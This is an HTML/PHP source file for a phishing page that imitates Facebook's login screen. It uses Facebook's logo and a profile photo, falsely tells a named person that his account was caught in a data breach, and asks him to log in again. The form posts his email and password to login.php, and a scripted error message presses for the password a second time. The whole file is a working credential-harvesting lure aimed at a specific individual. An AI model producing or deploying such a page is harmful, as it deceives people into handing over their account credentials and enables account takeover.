<!DOCTYPE html>
<html lang="en">
<head>
  <title>Facebook</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

 <style>
    html,body{
        margin:0;
        padding:0;
        width:100%;
        overflow: hidden;
    }
    .container-logo{
        width:37%;
        position:relative;
        display:block;
        margin: 25px auto;
    }
    .container-logo .fb-lg{
        width:100%;
        position:relative;
        
    }
    .container-avatar{
        width:100%;
        text-align: center;
    }
    .container-avatar .avatar{
        border-radius: 100%;
    }
    .form-input-container{
        width:100%;
        display:flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }
    .form-input{
        margin: 10px 0;
        width: 100%;
        text-align: center;
    }
    .form-input .input{
        width: 88%;
        height: 25px;
        border: 1px solid gray;
        border-radius: 4px;
        padding: 8px;
        font-size: 14px;
    }
    .form-input .submit{
        width: 94%;
        background-color: #1877f2;
        border: none;
        color: white;
        font-size: 17px;
        font-weight: bold;
        padding: 8px;
        border-radius: 6px;
        border: 1px solid #8bbbf8;
    }
    form{
        width:100%;
        display:flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }
    .container-name{
        margin:20px;
        text-align: center;
    }
    .container-name .name{
        font-family: "Segoe UI Historic";
        font-weight: bold;
        font-size: 20px;
    }
    .container-alert{
        background-color: red;
        color: white;
        padding: 15px 0;
        width: 95%;
        margin: 0 auto;
        border-radius: 9px;
        margin-top: 10px;
        text-align: center;
    }
    .alert-msg{
        font-family: "Segoe UI Historic";
        width: 52%;
        font-size: 14px;
        padding: 25px;
    }
    .session-error{
        width:100%;
        background-color:red;
        font-family: "Segoe UI Historic";
        color:white;
        font-size:14px;
        padding: 10px 0;
    }
    .message{
        padding-left: 10px;
        font-size: 4vw;
        font-size: 3.5vw;
    }
</style>
</head>
<body>
<?php 

session_start();
if(isset($_SESSION['error'])){
    if($_SESSION['error']){

    ?>

    <div class="session-error">
            <div class="message">
                Please enter your password. <strong>Did you forget your password?</strong>
            </div>
    </div>
    <?php
    }
}
?>
<div class="container-logo">
    <img class="fb-lg" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
</div>
<div class="container-avatar">
    <img class="avatar" src="https://scontent.fcrk1-4.fna.fbcdn.net/v/t39.30808-1/241306912_2388994397899636_8794726192011204733_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=105&ccb=1-6&_nc_sid=7206a8&_nc_ohc=cy9EPmc8Dw8AX_sM4Vp&tn=5Sd3H4d2zEPzOE8G&_nc_ht=scontent.fcrk1-4.fna&oh=00_AT-yOF6qXob6fWdS70OHLtb5fOYqvup2yzbAVQNIBaklZw&oe=628576D8" alt="">
</div>
<div class="container-alert">
    <span class="alert-msg">
        Hi <strong>Chester</strong>, We found that your account was included in our data breach!
        Please login your details to get back again. 
        Thank you.
    </span>
</div>
<div class="container-name">
    <span class="name">
        Chester Jayson A. Romero
    </span>
</div>
<div class="form-input-container">
   <form action="login.php" method="POST">
    <div class="form-input">
        <input type="text"  name="email" class="input" placeholder="Mobile or Email" required>
    </div>

    <div class="form-input">
        <input type="password" name="password" class="input" placeholder="Password" required>
    </div>
    <div class="form-input">
        <input type="submit" class="submit" value="Log in">
    </div>
   </form>
</div>
</body>
</html>
